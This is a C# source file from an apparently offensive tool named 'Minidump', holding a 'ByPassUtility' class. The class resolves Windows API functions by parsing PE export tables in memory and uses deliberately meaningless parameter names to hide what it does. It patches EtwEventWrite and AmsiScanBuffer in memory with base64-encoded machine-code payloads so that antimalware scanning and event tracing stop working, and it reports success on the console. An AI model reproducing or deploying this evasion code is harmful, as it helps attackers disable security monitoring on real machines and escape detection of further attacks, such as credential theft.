using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

namespace Minidump
{
    public class ByPassUtility
    {
        public static IntPtr GetLoadedModuleAddress(string DLLName)
        {
            ProcessModuleCollection ProcModules = Process.GetCurrentProcess().Modules;
            foreach (ProcessModule Mod in ProcModules)
            {
                if (Mod.FileName.ToLower().EndsWith(DLLName.ToLower()))
                {
                    return Mod.BaseAddress;
                }
            }
            return IntPtr.Zero;
        }
        public static IntPtr GetExportAddress(IntPtr ModuleBase, string ExportName)
        {
            IntPtr FunctionPtr = IntPtr.Zero;
            try
            {
                // Traverse the PE header in memory
                Int32 PeHeader = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + 0x3C));
                Int16 OptHeaderSize = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + PeHeader + 0x14));
                Int64 OptHeader = ModuleBase.ToInt64() + PeHeader + 0x18;
                Int16 Magic = Marshal.ReadInt16((IntPtr)OptHeader);
                Int64 pExport = 0;
                if (Magic == 0x010b)
                {
                    pExport = OptHeader + 0x60;
                }
                else
                {
                    pExport = OptHeader + 0x70;
                }

                // Read -> IMAGE_EXPORT_DIRECTORY
                Int32 ExportRVA = Marshal.ReadInt32((IntPtr)pExport);
                Int32 OrdinalBase = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x10));
                Int32 NumberOfFunctions = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x14));
                Int32 NumberOfNames = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x18));
                Int32 FunctionsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x1C));
                Int32 NamesRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x20));
                Int32 OrdinalsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x24));

                // Loop the array of export name RVA's
                for (int i = 0; i < NumberOfNames; i++)
                {
                    string FunctionName = Marshal.PtrToStringAnsi((IntPtr)(ModuleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + NamesRVA + i * 4))));
                    if (FunctionName.Equals(ExportName, StringComparison.OrdinalIgnoreCase))
                    {
                        Int32 FunctionOrdinal = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + OrdinalsRVA + i * 2)) + OrdinalBase;
                        Int32 FunctionRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + FunctionsRVA + (4 * (FunctionOrdinal - OrdinalBase))));
                        FunctionPtr = (IntPtr)((Int64)ModuleBase + FunctionRVA);
                        break;
                    }
                }
            }
            catch
            {
                // Catch parser failure
                throw new InvalidOperationException("Failed to parse module exports.");
            }

            if (FunctionPtr == IntPtr.Zero)
            {
                // Export not found
                throw new MissingMethodException(ExportName + ", export not found.");
            }
            return FunctionPtr;
        }
        public static IntPtr GetLibraryAddress(string DLLName, string FunctionName, bool CanLoadFromDisk = false)
        {
            IntPtr hModule = GetLoadedModuleAddress(DLLName);
            if (hModule == IntPtr.Zero)
            {
                throw new DllNotFoundException(DLLName + ", Dll was not found.");
            }

            return GetExportAddress(hModule, FunctionName);
        }
        public static object DynamicAPIInvoke(string DLLName, string FunctionName, Type FunctionDelegateType, ref object[] Parameters)
        {
            IntPtr pFunction = GetLibraryAddress(DLLName, FunctionName);
            return DynamicFunctionInvoke(pFunction, FunctionDelegateType, ref Parameters);
        }
        public static object DynamicFunctionInvoke(IntPtr FunctionPointer, Type FunctionDelegateType, ref object[] Parameters)
        {
            Delegate funcDelegate = Marshal.GetDelegateForFunctionPointer(FunctionPointer, FunctionDelegateType);
            return funcDelegate.DynamicInvoke(Parameters);
        }
        private static byte[] xorEncDec(byte[] inputData, string keyPhrase)
        {
            //byte[] keyBytes = Encoding.UTF8.GetBytes(keyPhrase);
            byte[] bufferBytes = new byte[inputData.Length];
            for (int i = 0; i < inputData.Length; i++)
            {
                bufferBytes[i] = (byte)(inputData[i] ^ Encoding.UTF8.GetBytes(keyPhrase)[i % Encoding.UTF8.GetBytes(keyPhrase).Length]);
            }
            return bufferBytes;
        }


        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate IntPtr GetProcAddress(IntPtr UrethralgiaOrc, string HypostomousBuried);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate bool VirtualProtect(IntPtr GhostwritingNard, UIntPtr NontabularlyBankshall, uint YohimbinizationUninscribed, out uint ZygosisCoordination);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate IntPtr LoadLibrary(string LiodermiaGranulater);


        private static bool is64Bit()
        {
            if (IntPtr.Size == 4)
                return false;

            return true;
        }

        private static byte[] getETWPayload()
        {
            if (!is64Bit())
                return Convert.FromBase64String("whQA");
            return Convert.FromBase64String("ww==");
        }

        private static byte[] getAMSIPayload()
        {
            if (!is64Bit())
                return Convert.FromBase64String("uFcAB4DCGAA=");
            return Convert.FromBase64String("uFcAB4DD");
        }


        public static void PatchETW()
        {
            IntPtr pEtwEventSend = GetLibraryAddress("ntdll.dll", "EtwEventWrite");
            IntPtr pVirtualProtect = GetLibraryAddress("kernel32.dll", "VirtualProtect");

            VirtualProtect fVirtualProtect = (VirtualProtect)Marshal.GetDelegateForFunctionPointer(pVirtualProtect, typeof(VirtualProtect));

            var patch = getETWPayload();
            uint oldProtect;

            if (fVirtualProtect(pEtwEventSend, (UIntPtr)patch.Length, 0x40, out oldProtect))
            {
                Marshal.Copy(patch, 0, pEtwEventSend, patch.Length);
                Console.WriteLine("[+] Successfully unhooked ETW!");
            }
        }

        private static IntPtr getAMSILocation()
        {
            //GetProcAddress
            IntPtr pGetProcAddress = GetLibraryAddress("kernel32.dll", "GetProcAddress");
            IntPtr pLoadLibrary = GetLibraryAddress("kernel32.dll", "LoadLibraryA");

            GetProcAddress fGetProcAddress = (GetProcAddress)Marshal.GetDelegateForFunctionPointer(pGetProcAddress, typeof(GetProcAddress));
            LoadLibrary fLoadLibrary = (LoadLibrary)Marshal.GetDelegateForFunctionPointer(pLoadLibrary, typeof(LoadLibrary));

            return fGetProcAddress(fLoadLibrary("amsi.dll"), "AmsiScanBuffer");
        }

        private static IntPtr unProtect(IntPtr amsiLibPtr)
        {

            IntPtr pVirtualProtect = GetLibraryAddress("kernel32.dll", "VirtualProtect");

            VirtualProtect fVirtualProtect = (VirtualProtect)Marshal.GetDelegateForFunctionPointer(pVirtualProtect, typeof(VirtualProtect));

            uint newMemSpaceProtection = 0;
            if (fVirtualProtect(amsiLibPtr, (UIntPtr)getAMSIPayload().Length, 0x40, out newMemSpaceProtection))
            {
                return amsiLibPtr;
            }
            else
            {
                return (IntPtr)0;
            }

        }

        public static void PathAMSI()
        {

            IntPtr amsiLibPtr = unProtect(getAMSILocation());
            if (amsiLibPtr != (IntPtr)0)
            {
                Marshal.Copy(getAMSIPayload(), 0, amsiLibPtr, getAMSIPayload().Length);
                Console.WriteLine("[+] Successfully patched AMSI!");
            }
            else
            {
                Console.WriteLine("[!] Patching AMSI FAILED");
            }

        }
    }
}
